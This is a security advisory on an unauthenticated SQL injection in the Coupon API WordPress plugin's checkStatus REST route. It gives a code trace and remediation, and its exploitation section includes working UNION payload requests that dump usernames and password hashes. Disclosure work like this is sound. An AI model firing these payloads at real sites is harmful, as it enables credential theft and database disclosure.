# Coupon API (couponapi) <= 6.2.17 — Unauthenticated SQL Injection via REST `checkStatus` endpoint

## Component overview

| Field | Value |
|---|---|
| Plugin | Coupon API |
| Slug | `couponapi` |
| Version tested | 6.2.17 (latest, downloaded from downloads.wordpress.org during research) |
| Active installs | 200 (per wordpress.org at time of research) |
| Author | kamilkhan / Sellergize Web Technology Services (couponapi.org) |
| Plugin page | https://wordpress.org/plugins/couponapi/ |
| Source reviewed | https://downloads.wordpress.org/plugin/couponapi.6.2.17.zip |

Coupon API connects a WordPress site to the couponapi.org offer feed. On activation it creates three tables (`wp_couponapi_config`, `wp_couponapi_logs`, `wp_couponapi_upload`) and registers a REST endpoint used by the vendor's server-side monitoring to check sync status.

## Vulnerability classification

- **Class:** SQL Injection (CWE-89), unauthenticated, UNION-based
- **OWASP Top 10:** A03:2021 — Injection
- **CVSS 3.1:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` = **7.5 (High)**

Justification: network-exploitable, no user interaction, no privileges required when the plugin has no non-empty API key configured (the default state of a fresh install; the settings form also permits saving an empty key). Confidentiality impact is high: arbitrary table read from the WordPress database. Integrity and availability are unaffected by this sink (`get_results` executes a single SELECT; stacked queries are not possible through `$wpdb`).

**Pre-requisite:** the plugin must be active with no non-empty `API_KEY` row in `wp_couponapi_config`. This is the state of every fresh installation. An admin who saved the settings form with an empty key (permitted when autopilot is off, save-api-config.php:39-53) is in the same state.

## Related disclosure

CVE-2025-8692 (Wordfence, 2025) describes SQL injection via the `log_duration` parameter in Coupon API <= 6.2.12, reached from the **authenticated administrator** view (`views.php`). The instance documented here is a **different entry point**: the unauthenticated REST route `couponapi/v1/checkStatus`, registered with `permission_callback => '__return_true'`. It is present and unpatched in the latest 6.2.17 release. To the best of our knowledge no prior disclosure covers the REST path; this was verified by web search (WPScan's API requires a token and returned 403 to unauthenticated queries, so the WPScan database could not be checked directly).

## Discovery narrative

1. **Candidate sourcing.** A corpus of 7,091 wordpress.org plugin zips was assembled and scanned with a purpose-built PHP static analyzer (entry-point taxonomy: `admin_post_nopriv`, `wp_ajax_nopriv`, REST routes with `__return_true`, front-end hooks, shortcodes; sink taxonomy: `$wpdb->query/get_results/get_var` with string concatenation, `update_option`, file writes, `unserialize`). The scan surfaced 56,016 findings across 377 plugins.

2. **Static hit.** Triaging the REST-`__return_true` class flagged `couponapi` because the concatenated value lands in an **unquoted** position of the query. Most SQLi candidates in the corpus are neutralized by WordPress's `wp_magic_quotes()` (which addslashes-es all superglobals, blocking quoted-context breakout). An `INTERVAL $var` concat bypasses that defense entirely: the payload needs no quote characters, so `esc_sql()` is irrelevant.

3. **Code trace and hypothesis.** Entry: `couponapi.php:578` hooks `couponapi_register_api` on `rest_api_init`; `couponapi.php:393` registers the route with `permission_callback => '__return_true'`. Hypothesis: `duration` is concatenated unquoted into the `INTERVAL` clause at `couponapi.php:418`, and the API-key gate at `couponapi.php:413` passes on an unconfigured install because PHP compares `'' != null` as false.

## Methodology

Static analysis first (entry-point resolution, taint propagation, sink inspection, quoted vs unquoted position analysis), then dynamic verification in an isolated local test bench. No live third-party system was contacted; all traffic stayed on 127.0.0.1.

## Configuration and environment

| Item | Value |
|---|---|
| WordPress | 7.1.4 (latest at test time), fresh install, site "VulnLab" |
| PHP | 8.3.28 (cli, built-in server `php -S 127.0.0.1:8080`) |
| Database | MariaDB 11.4.5, database `wpdb`, prefix `wp_` |
| Test users | superadmin, simpleadmin, editor, author, contributor, subscriber (password: `password`) |
| Plugin state | couponapi 6.2.17 activated, never configured (no `API_KEY` row) |

Note on the bench: the spec's DDEV-based wpscan-vulnerability-test-bench could not be used in this environment (no docker daemon, no root). An equivalent bench was assembled from a static PHP build, a portable MariaDB binary tarball, and wp-cli, replicating the test-bench user roles. The deviation does not affect the vulnerability: the code path exercised is plugin code on a standard WordPress stack.

## Step-by-step exploitation

1. **Confirm the endpoint exists** (no authentication required):

   ```
   GET /wp-json/couponapi/v1/checkStatus?API_KEY=&duration=1 DAY
   ```

   On a host with pretty permalinks the path form works; otherwise use the rewrite-free form:

   ```
   GET /?rest_route=/couponapi/v1/checkStatus&API_KEY=&duration=1%20DAY
   ```

   Expected: HTTP 200 with a JSON object ending in `"logs":[...]`. If the plugin is configured with a non-empty key the response is `{"API_KEY":"Incorrect API Key"}` and the pre-requisite is not met.

2. **Inject a UNION payload** through `duration`:

   ```
   GET /?rest_route=/couponapi/v1/checkStatus&API_KEY=&duration=1%20DAY%20UNION%20SELECT%20user_login%2Cuser_pass%2C1%20FROM%20wp_users--%20-
   ```

   The query executed becomes:

   ```sql
   SELECT `logtime`, `message`, `msg_type` FROM `wp_couponapi_logs`
   WHERE logtime > NOW() - INTERVAL 1 DAY UNION SELECT user_login,user_pass,1 FROM wp_users-- -
   ```

   Expected: HTTP 200; the `logs` array now contains one object per WordPress user, with `logtime` = `user_login` and `message` = the bcrypt password hash.

3. **Read arbitrary columns/tables** by changing the SELECT list (`user_email`, `option_name,option_value` from `wp_options`, etc.).

Observed result in the bench (step 2): all six test users' `user_login` and `user_pass` values returned in the JSON response, unauthenticated, in a single request.

## Code tracing

`couponapi/couponapi.php`:

- **:578** — `add_action('rest_api_init', 'couponapi_register_api');`
- **:393-405** — `register_rest_route('couponapi/v1', 'checkStatus', ...)` with `'methods' => 'GET'`, `'callback' => 'couponapi_server_checks'`, `'permission_callback' => '__return_true'`. Only `API_KEY` and `debug_log` are registered args; `duration` is unregistered and passed through to the callback unsanitized.
- **:408** — `function couponapi_server_checks($data)`
- **:412-413** — `$response = couponapi_get_config(); if ($data['API_KEY'] != $response['API_KEY'])`. `couponapi_get_config()` (couponapi.php:196-221) returns config rows from `wp_couponapi_config`; on an unconfigured install there is no `API_KEY` row, so `$response['API_KEY']` evaluates to `null`. PHP loose comparison: `'' != null` is `false`, so the gate passes with an empty `API_KEY` GET parameter. (With `display_errors` off this is silent; in a dev environment PHP raises "Undefined array key" for the config side.)
- **:416** — `$log_duration = esc_sql($data['duration']);` — `esc_sql()` escapes quotes but the value is never placed inside quotes.
- **:418** — sink:
  ```php
  $response['logs'] = $wpdb->get_results("SELECT `logtime`, `message`, `msg_type` FROM `{$wpdb->prefix}couponapi_logs` WHERE logtime > NOW() - INTERVAL $log_duration AND $log_debug ORDER BY `microtime`");
  ```
  `$log_duration` is concatenated unquoted into the `INTERVAL` clause. `wp_magic_quotes()` does not interfere because the payload contains no quote characters. The trailing `-- -` comment removes the fixed `AND $log_debug ORDER BY` tail.

`save-api-config.php:39-53` (pre-requisite support): the settings form saves `API_KEY` even when empty as long as autopilot is off, so a configured-then-cleared install is also in the vulnerable state.

## Attacker perspective

An unauthenticated remote attacker can read arbitrary columns of arbitrary tables in the WordPress database in a single HTTP GET request: username and password-hash pairs for every account, password-reset tokens, user emails, option values (including siteurl, active plugins, and any secret-bearing option), and any other data the database holds. With the admin's bcrypt hash, an attacker can crack it offline and authenticate; with the same injection they can enumerate everything needed to plan privilege escalation. No authentication, no nonce, no user interaction, one request per query.

## Impact assessment

- **Confidentiality: High.** Full read access to the WordPress database via UNION SELECT.
- **Integrity: None.** The sink is `$wpdb->get_results()`; a single SELECT statement is executed.
- **Availability: None.** No destructive primitive in this sink.

## Remediation

In `couponapi/couponapi.php`:

1. **Validate `duration` strictly** (couponapi.php:416). The value is an interval for a log window; accept only a whitelist of allowed strings, e.g. `in_array($data['duration'], ['1 HOUR','6 HOUR','1 DAY','7 DAY','30 DAY'], true)` or a numeric-hours form cast with `absint()` and interpolated as `INTERVAL %d HOUR`. Reject everything else.
2. **Fix the API-key gate** (couponapi.php:413). Use a strict check that distinguishes "not configured" from "configured": `if (empty($response['API_KEY']) || !is_string($data['API_KEY']) || !hash_equals($response['API_KEY'], $data['API_KEY']))`, and refuse to serve logs at all when no key is configured rather than treating null as a valid credential.
3. **Bind the query** (couponapi.php:418). Use `$wpdb->prepare()` for any interpolated value and keep `duration` out of the string entirely after validation.
4. **Register the `duration` arg** in the route definition (couponapi.php:393-405) with a validation callback so the REST layer rejects malformed values before the callback runs.

## Timeline / disclosure note

- Research and verification performed against a local, isolated test bench; no third-party systems were tested.
- Reported to WPScan's vulnerability disclosure program. WPScan coordinates with the vendor; the vendor receives 30 days (extendable to 120) before escalation to the wordpress.org plugin team and public disclosure.
- CVE-2025-8692 (authenticated admin-path instance, <= 6.2.12) is cited as related prior art; the REST instance documented here was unpatched in 6.2.17, the latest release at the time of research.
